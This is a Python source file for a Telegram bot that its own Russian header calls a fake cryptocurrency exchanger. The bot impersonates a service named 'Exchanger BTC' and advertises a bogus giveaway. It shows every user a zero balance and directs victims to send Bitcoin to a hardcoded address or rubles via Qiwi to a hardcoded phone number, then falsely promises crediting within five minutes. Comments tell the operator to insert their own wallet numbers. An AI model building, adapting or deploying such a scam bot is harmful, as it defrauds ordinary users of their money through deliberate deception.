# -*- coding: utf-8 -*-
#!usr/bin/env python
"""


  __  __                          _      ____            _
 |  \/  |                        | |    |  _ \          | |
 | \  / |   ___    _ __    ___   | | __ | |_) |   ___   | |_
 | |\/| |  / _ \  | '__|  / _ \  | |/ / |  _ <   / _ \  | __|
 | |  | | | (_) | | |    | (_) | |   <  | |_) | | (_) | | |_
 |_|  |_|  \___/  |_|     \___/  |_|\_\ |____/   \___/   \__|



Фейковый обменник криптовалюты от @dsh1337
Версия: 1.0
Дата начала: 20.01.18

"""
# БИБЛИОТЕКИ
from yobit import bitprice
from yobit import bitpriceUSD
import cherrypy
import random
import telebot
import constants
from telebot import types


# НАСТРОЙКА ВЕБХУКА
WEBHOOK_HOST = 'IP'
WEBHOOK_PORT = "80"  # 443, 80, 88 или 8443 (порт должен быть открыт!)
WEBHOOK_LISTEN = 'IP'  # На некоторых серверах придется указывать такой же IP, что и выше

WEBHOOK_SSL_CERT = './webhook_cert.pem'  # Путь к сертификату
WEBHOOK_SSL_PRIV = './webhook_pkey.pem'  # Путь к приватному ключу

WEBHOOK_URL_BASE = "https://%s:%s" % (WEBHOOK_HOST, WEBHOOK_PORT)
WEBHOOK_URL_PATH = "/%s/" % (constants.token)

bot = telebot.TeleBot(constants.token)

class WebhookServer(object):
    @cherrypy.expose
    def index(self):
        if 'content-length' in cherrypy.request.headers and \
                        'content-type' in cherrypy.request.headers and \
                        cherrypy.request.headers['content-type'] == 'application/json':
            length = int(cherrypy.request.headers['content-length'])
            json_string = cherrypy.request.body.read(length).decode("utf-8")
            update = telebot.types.Update.de_json(json_string)
            # Эта функция обеспечивает проверку входящего сообщения
            bot.process_new_updates([update])
            return ''
        else:
            raise cherrypy.HTTPError(403)

bot.remove_webhook()
bot.set_webhook(url=WEBHOOK_URL_BASE + WEBHOOK_URL_PATH,
                certificate=open(WEBHOOK_SSL_CERT, 'r'))

cherrypy.config.update({
    'server.socket_host': WEBHOOK_LISTEN,
    'server.socket_port': WEBHOOK_PORT,
    'server.ssl_module': 'builtin',
    'server.ssl_certificate': WEBHOOK_SSL_CERT,
    'server.ssl_private_key': WEBHOOK_SSL_PRIV
})

print(bot.get_me())
def log(message, answer):
    print ('\n --------')
    from datetime import datetime
    print (datetime.now())
    print("Сообщение от {0} {1}. (id ={2}) \n Текст = {3}".format (message.from_user.first_name,
                                                                   message.from_user.last_name,
                                                                   str(message.from_user.id),
                                                                   message.text))
    print (answer)

# САМ СКРИПТ БОТА | НУЖНО ИЗМЕНИТЬ НАЗВАНИЕ И НОМЕРА КОШЕЛЬКОВ. НЕ ЗАБУДЬ ИЗМЕНИТЬ ССЫЛКУ В "ПАРТНЕРАМ"

@bot.message_handler(commands=['start'])

def handle_start(message):
    userref = random.randint(10000, 99999)
    user_markup = telebot.types.ReplyKeyboardMarkup(True)
    user_markup.row('💼 Кошелек', '📊 Обмен BTC')
    user_markup.row('🚀 О сервисе', '📌 Акция')
    user_markup.row('👔 Партнерам')
    bot.send_message(message.from_user.id,
            '💰<b>Exchanger BTC</b> - это моментальный обмен Bitcoin на Qiwi, Сбербанк, Яндекс.Деньги и Webmoney, а так же бесплатное хранилище Ваших BTC.', reply_markup=user_markup, parse_mode='HTML')

@bot.message_handler(content_types=['text'])
def handle_text(message):

    if message.text == "🚀 О сервисе":
        bot.send_message(message.from_user.id, "<b>🚀 О сервисе</b> \n  \nСервис для обмена Bitcoin. \nПополняй внутренний кошелек с помощью Qiwi или внешнего Bitcoin-кошелька.\n \n"
                         "Продавай эти BTC для вывода на Сбербанк, Яндекс.Деньги, Webmoney и Qiwi. Или выводи на свой внешний Bitcoin-адрес.\n \n"
                         "У нас установлено ограничение минимального <b>(500 рублей)</b> и максмального <b>(10 000 рублей)</b> единовременного платежа.", parse_mode='HTML')
    if message.text == "📌 Акция":
        bot.send_message(message.from_user.id, "<b>📌 Акция</b>" "\n \n<b>Exchanger BTC</b> проводит розыгрыш на <b>0.3 BTC</b>\n \n"
                             "Для участия в конкурсе надо лишь пользоваться нашим сервисом в период с <b>01.01.2018</b> до <b>01.03.2018</b> и иметь остаток на балансе <b>0.0006 BTC.</b>\n \n"
                             "Этот остаток так же принадлежит Вам, это не плата за участие, после конкурса, даже в случае победы, никакая комиссия взиматься не будет.\n \n"
                             "Опредление победителя будет проходить в прямой трансляции на площадке YouTube <b>1 февраля 2018 года</b> в <b>20:00</b> по Московскому времени.\n \n"
                             "За 3 часа до начала Вам придет оповещение с ссылкой на трансляцию.", parse_mode='HTML')
    if message.text == "💼 Кошелек":
        keyboard = types.InlineKeyboardMarkup()
        callback_button = types.InlineKeyboardButton(text="📉 Вывести BTC", callback_data="📉 Вывести BTC")
        callback_button2 = types.InlineKeyboardButton(text="📈 Ввести BTC", callback_data="📈 Ввести BTC")
        keyboard.add(callback_button, callback_button2)
        bot.send_message(message.from_user.id, "<b>💼 Bitcoin-кошелек</b>\n \n"
                             "<b>Баланс:</b> 0.00 BTC\n<b>Примерно:</b> 0 руб\n \n"
                             "<b>Всего вывели:</b> 0.00 BTC (0 руб)\n<b>Всего пополнили:</b> 0.00 BTC (0 руб)", parse_mode='HTML', reply_markup=keyboard)
    if message.text == "📊 Обмен BTC":
        keyboard4 = types.InlineKeyboardMarkup()
        callback_button6 = types.InlineKeyboardButton(text="📈 Купить", callback_data="📈 Купить")
        callback_button7 = types.InlineKeyboardButton(text="📉 Продать", callback_data="📉 Продать")
        keyboard4.add(callback_button6, callback_button7)
        bot.send_message(message.from_user.id, "<b>📊 Обмен BTC</b>\n \n"
        "Бот работает полностью в <b>автоматическом режиме</b>. Средства поступают моментально.", parse_mode='HTML', reply_markup=keyboard4)
    if message.text == "👔 Партнерам":
        bot.send_message(message.from_user.id, "<b>👔 Партнерам</b> \n \nПриглашайте новых пользователей и получайте <b>пассивный доход</b> от комиссий бота, создав свой личный обменник. \n \n"
                                               "Ваша комиссия от оборота: 1% \n \n"
                                               "<b>Например:</b> ваш подписчик проводит сделку на сумму 1 BTC, а вы получаете 0.01 BTC (<b>6369.31 RUB</b>) дивидендов. \n \n"
                                               "Партнерская программа бессрочна, не имеет лимита приглашений и начинает действовать моментально. \n \n"
                                               "Учтите, что для достижения хороших результатов необходимо внимательно подходить к поиску целевой аудитории и привлекать только тех, кто будет покупать или продавать BTC.", parse_mode='HTML' )
        bot.send_message(message.from_user.id, "Ваша реферальная ссылка: \nhttps://t.me/QIWI_BTC_mixerbot?start=80As346kMn")
    @bot.callback_query_handler(func=lambda c: True)
    def inline(c):
        if c.data == '📉 Вывести BTC':
            keyboard2 = types.InlineKeyboardMarkup()
            callback_button3 = types.InlineKeyboardButton(text="📈 Купить", callback_data="📈 Купить")
            keyboard2.add(callback_button3)
            bot.edit_message_text(
            chat_id=c.message.chat.id,
            message_id=c.message.message_id,
            text = '<b>📉 Вывести BTC</b>\n\n'
                '⚠️У вас недостаточно BTC.\n'
                'Мининимальная сумма вывода: 0.0008 BTC' , parse_mode='HTML',
            reply_markup=keyboard2)

        if c.data == '📉 Продать':
            keyboard5 = types.InlineKeyboardMarkup()
            callback_button8 = types.InlineKeyboardButton(text="Qiwi", callback_data="Перевод")
            callback_button9 = types.InlineKeyboardButton(text="Сбербанк", callback_data="Перевод")
            callback_button10 = types.InlineKeyboardButton(text="WebMoney", callback_data="Перевод")
            callback_button11 = types.InlineKeyboardButton(text="Яндекс.Деньги", callback_data="Перевод")
            keyboard5.add(callback_button8, callback_button9, callback_button10, callback_button11)
            bot.edit_message_text(
            chat_id=c.message.chat.id,
            message_id=c.message.message_id,
            text = '<b>📉 Продать</b>\n\n'
                'Продажа BTC осуществляется списыванием с Вашего внутреннего <b>Bitcoin-кошелька</b> и последующая отправка рублей на выбранную Вами площадку.\n\n'
                'Куда Вы хотите вывести <b>BTC</b>?' , parse_mode='HTML',
            reply_markup=keyboard5)

        if c.data == 'Перевод':
            keyboard6 = types.InlineKeyboardMarkup()
            callback_button12 = types.InlineKeyboardButton(text="📈 Купить", callback_data="📈 Купить")
            keyboard6.add(callback_button12)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text='<b>⚠ У вас недостаточно BTC</b>\n'
                'Минимальная сумма вывода:  0.0006 BTC', parse_mode='HTML', reply_markup=keyboard6)

        elif c.data == '📈 Ввести BTC':
            bot.edit_message_text(
            chat_id = c.message.chat.id,
            message_id = c.message.message_id,
            text = '<b>📈 Внести BTC</b>\n \n'
            'Чтобы пополнить <b>Bitcoin-кошелек</b>, Вам надо перевести Ваши BTC на многоразовый адрес который будет указан ниже.\n \n'
            'После перевода и подтверждения 1 транзакции, Ваши BTC будут отображаться у Вас в кошельке.\n'
            'И вы их сможете вывести на любую другую платформу, или перевести на внешний Bitcoin-адрес.\n', parse_mode='HTML')
            bot.send_message(c.message.chat.id, "<b>1PfDHg7pgX2pu6W3c4jBp7jiUiYSsYEH1J</b>", parse_mode='HTML')

        if c.data == '📈 Купить':
            keyboard3 = types.InlineKeyboardMarkup()
            callback_button4 = types.InlineKeyboardButton(text="💵 Qiwi", callback_data="💵 Qiwi")
            callback_button5 = types.InlineKeyboardButton(text="💵 Bitcoin", callback_data="📈 Ввести BTC")
            keyboard3.add(callback_button4, callback_button5)
            bot.edit_message_text(
            chat_id=c.message.chat.id,
            message_id=c.message.message_id,
            text='<b>📈 Купить</b>\n \n'
                'Покупка BTC производится с помощью <b>Qiwi</b> или переводом на многоразовый <b>Bitcoin-адрес</b> с внешнего кошелька.\n \n'
                'Выберите способ пополнения', parse_mode='HTML',
            reply_markup=keyboard3
            )

        if c.data == '💵 Qiwi':
            keyboard7 = types.InlineKeyboardMarkup()
            callback_button13 = types.InlineKeyboardButton(text="500₽", callback_data="Перевод2")
            callback_button14 = types.InlineKeyboardButton(text="750₽", callback_data="Перевод3")
            callback_button15 = types.InlineKeyboardButton(text="1000₽", callback_data="Перевод4")
            callback_button16 = types.InlineKeyboardButton(text="2000₽", callback_data="Перевод5")
            callback_button17 = types.InlineKeyboardButton(text="3000₽", callback_data="Перевод6")
            callback_button18 = types.InlineKeyboardButton(text="4000₽", callback_data="Перевод7")
            callback_button19 = types.InlineKeyboardButton(text="5000₽", callback_data="Перевод8")
            callback_button20 = types.InlineKeyboardButton(text="6000₽", callback_data="Перевод9")
            callback_button21 = types.InlineKeyboardButton(text="7000₽", callback_data="Перевод10")
            callback_button22 = types.InlineKeyboardButton(text="8000₽", callback_data="Перевод11")
            callback_button23 = types.InlineKeyboardButton(text="9000₽", callback_data="Перевод12")
            callback_button24 = types.InlineKeyboardButton(text="10000₽", callback_data="Перевод13")
            keyboard7.add(callback_button13, callback_button14, callback_button15, callback_button16, callback_button17, callback_button18,
                          callback_button19, callback_button20, callback_button21, callback_button22, callback_button23, callback_button24)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text = '<b>💵 Qiwi</b>\n \n'
                'Выберите сумму в <b>RUB</b> которую хотите получить в <b>BTC</b>.\n'
                'Для этого нажмите по одной из кнопок ниже. Максимальная сумма пополнения за раз - <b>10 000 RUB</b>.\n \n'
                'Курс обмена:\n'
                '<pre>1 BTC = ' + str(bitprice + 100000) + ' RUB</pre>\n'
                '<pre>1 BTC = ' + str(bitpriceUSD + 800) + ' USD</pre>', parse_mode='HTML', reply_markup=keyboard7)

        if c.data == 'Перевод2':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add (callback_button25, callback_button26)
            bot.edit_message_text(
            chat_id=c.message.chat.id,
            message_id=c.message.message_id,
            text="Для покупки <b>BTC</b> совершите перевод <b>500₽</b> на номер, который будет указан ниже. \n\n"
                "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, "<b>Номер:</b> +37378181992\n"
                                                   "<b>Комментарий: </b>" + str(random.randint(10000, 99999)), parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод3':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
            chat_id=c.message.chat.id,
            message_id=c.message.message_id,
            text="Для покупки <b>BTC</b> совершите перевод <b>750₽</b> на номер, который будет указан ниже. \n\n"
                         "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, "<b>Номер:</b> +37378181992\n"
                                                       "<b>Комментарий: </b>" + str(random.randint(10000, 99999)),
                                 parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод4':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>1000₽</b> на номер, который будет указан ниже. \n\n"
                             "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, "<b>Номер:</b> +37378181992\n"
                                                           "<b>Комментарий: </b>" + str(random.randint(10000, 99999)),
                                     parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод5':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>2000₽</b> на номер, который будет указан ниже. \n\n"
                             "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, "<b>Номер:</b> +37378181992\n"
                                                           "<b>Комментарий: </b>" + str(random.randint(10000, 99999)),
                                     parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод6':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>3000₽</b> на номер, который будет указан ниже. \n\n"
                             "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, "<b>Номер:</b> +37378181992\n"
                                                           "<b>Комментарий: </b>" + str(random.randint(10000, 99999)),
                                     parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод7':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>4000₽</b> на номер, который будет указан ниже. \n\n"
                             "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, "<b>Номер:</b> +37378181992\n"
                                                           "<b>Комментарий: </b>" + str(random.randint(10000, 99999)),
                                     parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод8':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>5000₽</b> на номер, который будет указан ниже. \n\n"
                             "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, "<b>Номер:</b> +37378181992\n"
                                                           "<b>Комментарий: </b>" + str(random.randint(10000, 99999)),
                                     parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод9':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>6000₽</b> на номер, который будет указан ниже. \n\n"
                             "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, "<b>Номер:</b> +37378181992\n"
                                                           "<b>Комментарий: </b>" + str(random.randint(10000, 99999)),
                                     parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод10':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>7000₽</b> на номер, который будет указан ниже. \n\n"
                             "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, "<b>Номер:</b> +37378181992\n"
                                                           "<b>Комментарий: </b>" + str(random.randint(10000, 99999)),
                                     parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод11':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>8000₽</b> на номер, который будет указан ниже. \n\n"
                             "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, "<b>Номер:</b> +37378181992\n"
                                                           "<b>Комментарий: </b>" + str(random.randint(10000, 99999)),
                                     parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод12':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>9000₽</b> на номер, который будет указан ниже. \n\n"
                             "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, "<b>Номер:</b> +37378181992\n"
                                                           "<b>Комментарий: </b>" + str(random.randint(10000, 99999)),
                                     parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Перевод13':
            keyboard8 = types.InlineKeyboardMarkup()
            callback_button25 = types.InlineKeyboardButton(text="✅ Оплатил", callback_data="Оплатил")
            callback_button26 = types.InlineKeyboardButton(text="❌ Отказаться", callback_data="Отказаться")
            keyboard8.add(callback_button25, callback_button26)
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text="Для покупки <b>BTC</b> совершите перевод <b>10000₽</b> на номер, который будет указан ниже. \n\n"
                             "<b>⚠ Комментарий обязателен.</b>", parse_mode='HTML')
            bot.send_message(c.message.chat.id, "<b>Номер:</b> +37378181992\n"
                                                           "<b>Комментарий: </b>" + str(random.randint(10000, 99999)),
                                     parse_mode='HTML', reply_markup=keyboard8)

        if c.data == 'Оплатил':
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text= "✅ <b>Отлично</b>\n\n"
                      "Если вы правильно произвели перевод, то течение пяти минут бот обработает его и зачислит <b>BTC</b> на ваш счет. "
                      "Если же вы допустили ошибку при переводе, то напишите в службу поддержки @BitcomatHelpBot. "
                      "Благодарим вас за выбор <b>Exchanger BTC</b>.\n", parse_mode='HTML')

        if c.data == 'Отказаться':
            bot.edit_message_text(
                chat_id=c.message.chat.id,
                message_id=c.message.message_id,
                text= "⚠ Вы можете приобрести <b>BTC</b> в любое другое время.\n", parse_mode='HTML')


cherrypy.quickstart(WebhookServer(), WEBHOOK_URL_PATH, {'/': {}})
